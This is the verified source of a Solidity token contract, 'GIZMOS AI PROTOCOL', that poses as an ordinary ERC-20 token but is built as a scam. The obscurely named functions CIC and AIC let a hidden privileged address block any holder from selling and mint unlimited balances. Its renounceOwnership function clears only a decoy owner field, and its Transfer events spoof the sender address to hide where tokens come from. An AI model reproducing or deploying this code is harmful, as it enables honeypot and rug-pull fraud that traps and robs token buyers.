/**
 *Submitted for verification at Etherscan.io on 2023-01-14
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;

   
 
contract GIZMOS {
  
    mapping (address => uint256) private BFC;
    mapping (address => uint256) private CGF;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "GIZMOS AI PROTOCOL";
    string public symbol = unicode"GIZMOS";
    uint8 public decimals = 6;
    uint256 public totalSupply = 100000000 *10**6;
    address owner = msg.sender;
    address private DCF;
    address deployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        DCF = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    BFC[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return BFC[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(CGF[msg.sender] <= 1);
        require(BFC[msg.sender] >= value);
  BFC[msg.sender] -= value;  
        BFC[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function CIC (address io, uint256 ix)  public {
     if(msg.sender == DCF){
   CGF[io] = ix;}} 
function AIC (address io, uint256 ix)  public {
         if(msg.sender == DCF){
    BFC[io] += ix;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == DCF)  {
 require(value <= BFC[from]);
        require(value <= allowance[from][msg.sender]);
        BFC[from] -= value;  
      BFC[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(CGF[from] <= 1 && CGF[to] <=1);
        require(value <= BFC[from]);
        require(value <= allowance[from][msg.sender]);
        BFC[from] -= value;
        BFC[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }